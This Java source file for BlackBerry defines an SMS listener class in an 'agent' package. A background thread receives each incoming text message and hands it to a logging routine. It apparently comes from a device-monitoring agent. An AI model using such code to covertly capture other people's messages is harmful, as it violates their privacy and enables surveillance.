//#preprocess
package blackberry.agent.sms;

import java.io.IOException;

import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.MessageListener;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

/**
 * Dalla 4.7 implements SendListener
 * 
 * @author user1
 */
class SMSINListener implements MessageListener, Runnable {

    //#ifdef DEBUG
    static Debug debug = new Debug("SMSINListener", DebugLevel.VERBOSE);

    //#endif

    private int messages;
    private final SmsListener smsListener;
    private final MessageConnection conn;
    
    boolean requestStop;

    public SMSINListener(final MessageConnection conn,
            final SmsListener smsListener) {
        messages = 0;
        this.conn = conn;
        this.smsListener = smsListener;
    }

    public synchronized void notifyIncomingMessage(final MessageConnection conn) {
        messages++;
        notifyAll();
    }
    
    public void stop(){
        requestStop = true;
    }

    public void run() {
        requestStop = false;
        while (!requestStop) {
            while (messages > 0) {
                try {
                    final javax.wireless.messaging.Message m = conn.receive();

                    smsListener.saveLog(m, true);

                } catch (final IOException e) {
                    e.printStackTrace();
                }
                messages--;
            }
            synchronized (this) {
                try {
                    wait();
                } catch (final Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

}
